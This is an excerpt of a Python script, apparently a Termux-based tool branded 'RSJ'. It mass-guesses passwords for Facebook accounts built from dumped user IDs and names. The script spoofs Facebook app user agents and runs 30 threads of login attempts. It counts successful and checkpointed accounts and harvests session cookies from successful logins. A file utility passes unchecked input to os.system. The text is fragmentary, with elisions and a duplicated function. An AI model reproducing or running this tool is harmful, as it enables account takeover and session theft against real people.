...
from concurrent.futures import ThreadPoolExecutor as sarfrazRSJ
from string import * 
...
def randBuildvsskj():
    ...
    END = '[Mozilla/5.0 (Linux; Android 10; itel W5006X Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36;]'
    ua = f'Mozilla/5.0 (Linux; Android 13; SM-A146P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36;])) '+END
    return ua

def randBuildvsskj():
    END = '[Mozilla/5.0 (Linux; Android 10; Twist 4 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/363.0.0.6.63;]}]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

sys.stdout.write('\x1b]2; RSJ\x07')
R = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
S = '\x1b[38;5;48m'
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);RSJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RSJb};{ckkk}"
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RSJ] {loop} | M33 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazRSJ(max_workers=30) as RSJworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                RSJworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                RSJworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                RSJworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                RSJworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/RSJ.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/RSJ.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    RSJ = input('Put File Name :')
    print(" ")
    sarfraz = input('Saving Put File Name :')
    os.system('touch ' +sarfraz)
    os.system('sort -r '+RSJ+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + RSJ )
    print(47*'-')
    print("File Saved To :" + sarfraz )
    print(47*'-')
    input(f"{S} Press Enter To Back RSJ Menu ")
    menu
